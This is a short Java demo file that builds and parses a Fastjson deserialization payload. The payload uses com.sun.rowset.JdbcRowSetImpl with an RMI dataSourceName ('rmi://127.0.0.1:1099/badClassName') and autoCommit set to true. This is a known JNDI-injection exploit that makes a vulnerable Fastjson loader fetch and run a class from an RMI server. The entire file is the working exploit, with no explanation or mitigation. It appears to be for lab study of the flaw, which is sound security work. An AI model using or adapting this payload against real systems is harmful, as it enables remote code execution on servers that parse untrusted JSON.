package demo.fastjsondemo;

import com.alibaba.fastjson.JSON;

public class Fastjson_Jdbc_RMI {
    public static void main(String[] args) {
        String payload = "{" +
                "\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"," +
                "\"dataSourceName\":\"rmi://127.0.0.1:1099/badClassName\", " +
                "\"autoCommit\":true" +
                "}";
        JSON.parse(payload);
    }
}
